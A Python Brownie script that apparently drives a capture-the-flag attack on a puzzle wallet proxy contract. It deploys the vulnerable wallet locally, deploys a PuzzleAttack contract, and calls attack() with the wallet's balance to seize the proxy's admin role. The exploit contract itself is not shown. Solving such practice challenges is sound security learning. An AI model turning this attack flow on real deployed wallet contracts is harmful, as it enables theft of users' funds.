from scripts.helpful_scripts import POINT_ONE, TEN, get_account, ONE
from web3 import Web3
from web3.auto import w3
from brownie import (
    PuzzleWalletFactory,
    PuzzleWallet,
    PuzzleProxy,
    PuzzleAttack,
    network,
    Contract,
)


def deploy_PuzzleWallet():
    deployer = get_account(index=1)
    factory = PuzzleWalletFactory.deploy(
        {"from": deployer},
    )
    tx = factory.createInstance(deployer, {"from": deployer, "value": POINT_ONE / 100})
    proxy = tx.return_value
    return proxy


def deploy_PuzzleAttack(proxy):
    account = get_account()
    attack = PuzzleAttack.deploy(proxy, {"from": account})
    return attack


def main():
    print(network.show_active())
    # accounts
    account = get_account()
    deployer = get_account(index=1)  # local testing
    print(f"account address: {account}")
    print(f"deployer address: {deployer}")  # local testing

    # Proxy
    proxy = deploy_PuzzleWallet()  # local testing
    # proxy_address = "0x61D1bB51EB0173E114D1ad0A9f95D41c6073D55e"
    proxy = Contract.from_abi(PuzzleProxy._name, proxy, PuzzleProxy.abi)

    # Proxy contract
    instance = Contract.from_abi(PuzzleWallet._name, proxy, PuzzleWallet.abi)
    print(f"Wallet admin: {proxy.admin()}")

    # Attack
    attackcontract = deploy_PuzzleAttack(proxy)
    attackcontract.attack({"from": account, "value": instance.balance()})

    print(f"Wallet admin: {proxy.admin()}")
